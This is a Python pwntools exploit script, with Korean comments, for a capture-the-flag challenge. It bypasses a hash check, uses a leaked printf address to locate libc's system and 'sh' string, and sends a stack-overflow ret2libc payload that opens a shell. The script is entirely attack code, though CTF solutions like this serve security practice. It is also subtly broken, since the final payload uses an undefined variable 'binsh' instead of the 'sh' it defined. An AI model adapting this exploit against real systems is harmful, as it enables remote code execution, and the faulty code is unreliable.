from pwn import *

'''
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
'''

context(arch='i386', os='linux')

r = remote("ctf.j0n9hyun.xyz", 3015)

# 입력값과 hashcode값을 비교하는 부분이 있는데
# 4바이트씩 5번 더한 값이 맞는지 확인한다
# 첫 4바이트는 hashcode값을 넣고 나머지는 0으로 채워준다.
# null을 넣지 못하는 상황이라면 5개로 적절히 나누어 넣으면 된다.
hashcode = p32(0xC0D9B0A7)
hashcode += p32(0x00)*4

payload = hashcode

r.recv()
r.sendline(payload)

# 처음 hash검증을 통과하면 printf 함수의 주소를 준다
# 이것으로 base를 구할 수 있으므로 주어진 libc를 이용해
# system과 sh 주소를 구한다.
# /bin/sh로 해도 되지만 sh문자열 하나만으로도 충분하다.
r.recvuntil("0x")
printf = int(r.recv(8),16)
print(hex(printf))
base = printf - 0x49020
system = p32(base + 0x3a940)
sh = p32(base + 0x159030)
dummy = b"A"*(0x3e+4)
ret = p32(0x8048426)

payload  = dummy
payload += system
payload += b"AAAA"
payload += binsh

r.send(payload)
r.interactive()
